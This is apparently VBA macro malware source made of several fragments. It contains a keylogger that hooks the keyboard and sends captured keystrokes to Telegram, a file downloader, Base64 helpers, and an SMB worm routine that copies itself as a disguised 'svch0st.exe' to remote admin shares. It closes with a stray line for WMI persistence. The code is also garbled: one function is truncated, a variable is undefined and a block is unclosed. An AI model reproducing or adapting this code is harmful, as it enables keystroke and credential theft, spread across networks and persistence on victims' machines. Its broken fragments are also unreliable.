' ========================
Private Function LowLevelKeyboardProc(ByVal nCode As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
    On Error Resume Next
    If nCode >= 0 Then
        If wParam = WM_KEYDOWN Then
            Dim p As KBDLLHOOKSTRUCT
            CopyMemory p, ByVal lParam, Len(p)
            Dim keyName As String: keyName = Space(32)
            GetKeyNameTextA ((p.scanCode << 16) Or (p.flags << 24)), keyName, 32
            keyName = Trim(keyName)
            If Len(keyName) > 0 Then
                If keyName = "Return" Then keyName = "[ENTER]"
                If keyName = "Tab" Then keyName = "[TAB]"
                If keyName = "Space" Then keyName = " "
                If Len(keyName) = 1 And keyName Like "[A-Za-z]" Then
                    If (GetKeyState(&H10) And &H8000) = 0 Then keyName = LCase(keyName)
                End If
                gKeylogBuffer = gKeylogBuffer & keyName
                If Len(gKeylogBuffer) > 1000 Then
                    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
                    Dim ts As Object: Set ts = fso.OpenTextFile(gKeylogFile, 8, True)
                    ts.Write gKeylogBuffer
                    ts.Close
                    SendToTelegramChunked "KEYLOG|" & gKeylogBuffer
                    gKeylogBuffer = ""
                End If
            End If
        End If
    End If
    LowLevelKeyboardProc = CallNextHookEx(gKeyloggerHook, nCode, wParam, lParam)
End Function

Private Sub StartKeylogger()
    On Error Resume Next
    gKeylogFile = GetTempDir() & "keylog.txt"
    gKeyloggerHook = SetWindowsHookExA(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, GetModuleHandleA(vbNullString), 0)
End Sub

Function DownloadFile(url As String, destPath As String) As Boolean
    On Error GoTo Fail
    Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile destPath, 2
        stream.Close
        DownloadFile = True
        Exit Function
    End If
Fail:
    DownloadFile = False
End Function

Function DecodeBase64(b64 As String) As Byte()
    On Error GoTo Fail
    Dim lenOut As Long: lenOut = 0
    CryptStringToBinaryA StrPtr(b64), Len(b64), 1, 0, lenOut, 0, 0
    Dim out() As Byte: ReDim out(lenOut - 1)
    CryptStringToBinaryA StrPtr(b64), Len(b64), 1, VarPtr(out(0)), lenOut, 0, 0
    DecodeBase64 = out
    Exit Function
Fail:
    Dim xml As Object: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("b64")
    xml.DataType = "bin.base64": xml.Text = b64
    DecodeBase64 = xml.nodeTypedValue
End Function

Function EncodeBase64(data() As Byte) As String
    Dim lenOut As Long: lenOut = 0

Sub SMBPropagation()

    Dim line As Variant
    For Each line In lines
        If InStr(line, "\\") > 0 Then
            Dim share As String: share = Trim(line)
            share = Left(share, InStr(share, " "))
            Dim remotePath As String: remotePath = share & "\C$\svch0st.exe"
            Dim src As String: src = GetTempDir() & "svch0st.exe"
            Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
            If Not fso.FileExists(src) Then
                fso.CopyFile ThisWorkbook.FullName, src, True

            fso.CopyFile src, remotePath, True
            If Err.Number = 0 Then
                SetAttr remotePath, vbHidden + vbSystem
                SendToTelegram "SMB_PROPAGATED|" & share
            End If
        End If
    Next
End Sub

               "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}"
